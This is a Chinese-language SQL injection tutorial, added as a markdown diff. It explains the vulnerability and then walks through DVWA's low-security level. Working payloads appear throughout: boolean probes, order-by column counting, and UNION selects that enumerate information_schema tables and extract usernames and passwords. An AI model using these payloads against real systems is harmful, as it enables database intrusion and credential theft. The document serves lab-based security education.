@@ -1,0 +1,62 @@
+**解密SQL注入漏洞
+
+##耳熟能详的SQL注入是什么
+----关于SQL注入漏洞，维基百科是这样解释的：
+---SQL注入(英语：SQL injection)，也称SQL注入或SQL注码，是发生于应用程序与数据库层的安全漏洞。简而言之，是在输入的字符串之中注入
+SQL指令，在设计不良的程序当中忽略了字符检查，那么这些注入进去的恶意指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到破坏
+或是入侵。
+
+##先了解SQL是什么
+----SQL：用于控制数据库的语言
+----SQL：Structured Query Language 结构化查询语言
+
+##隐患严重的漏洞——SQL injection
+
+----用户查询电影《长津湖》票房数据——输入长津湖，服务器从数据库里取出数据(这个操作开发人员就要用到SQL语句)，展示给用户
+++怎么利用和攻击这个网站呢？
+----先想象一下后台是怎样从数据库中查询数据的
+----select ticket_num from Movie_data where movie_name="长津湖";
+----其中ticket_num代表票房数据，Movie_data代表电影信息数据库，movie_name代表电影名称，"长津湖"代表用户输入想要查的电影
+----译为：从电影信息数据库中查询电影名称为长津湖的票房数据
+
+----作为一个黑客你要怎么做
+---select ticket_num from Movie_data where movie_name='长津湖' order by 1 #';
+---用户输入的数据为 ：长津湖' order by 1 #
+---这时SQL语句发生变化，不仅查询了长津湖票房，还执行了order by 1
+----黑客攻击SQL注入漏洞，使原有SQL语句被改变，可以简单理解为：能改变原有SQL语句的漏洞就是SQL注入
+
+##SQL injection low
+
+----通过查看源代码，可以看到后台执行的SQL语句为
+---SELECT first_name,last_name FROM users WHERE user_id='$id';
+---其中$id为用户输入的内容
+
+----SQL injection low:怎样判断SQL注入漏洞呢
+---通过查看源代码，可以看到后台执行的SQL语句为：
+--SELECT first_name,last_name FROM users WHERE user_id='1'and 1=1#';
+-用户输入的数据为：1'and 1=1#
+-这时SQL语句发生变化，在原有查询完成后会判断1=1(这明显是对的)，如果判断正确则才会有输出[#作用是注释(移除)后续SQL语句]
+-----SELECT first_name,last_name FROM users WHERE user_id='1'and 1=2#';
+-用户输入的数据为：1'and 1=2#
+-这时SQL语句发生变化，在原有查询完成后会判断1=2(这明显是错的)，如果判断正确则才会正常输出
+++两次尝试1=1正常输出，1=2错误输出，证明SQL语句生效，存在SQL注入漏洞
+
+----SQL injection low:怎样利用SQL注入漏洞呢
+---一般步骤如下：
+--1.判断列/字段数  order by [column_num]
+-SELECT first_name,last_name FROM users WHERE user_id='1' order by 1#';
+-SELECT first_name,last_name FROM users WHERE user_id='1' order by 2#';
+-SELECT first_name,last_name FROM users WHERE user_id='1' order by 3#';
+--2.联合查询其他信息 union select [sql][sql]
+-SELECT first_name,last_name FROM users WHERE user_id='1' union select user(),database()#';
+-用户输入SQL语句，执行了MySQL内置函数user()和database()
+-其中 user()：返回当前数据库连接用户    database()：返回当前数据库名称
+--3.联合查询表 union select table_name,table_schema from information_schema.tables where table_schema='[database_name]'
+-SELECT first_name,last_name FROM users WHERE user_id='1' union select  table_name,table_schema from information_schema.tables where table_schema='dvwa'#';
+-用户输入SQL语句，从information_schema数据库中查询dvwa数据库表
+--4.联合查询信息 union [query_sql]
+-SELECT first_name,last_name FROM user WHERE user_id='1' union select user,password from users#';
+-用户输入SQL语句，查询当前数据库的user和password数据
+
+
+
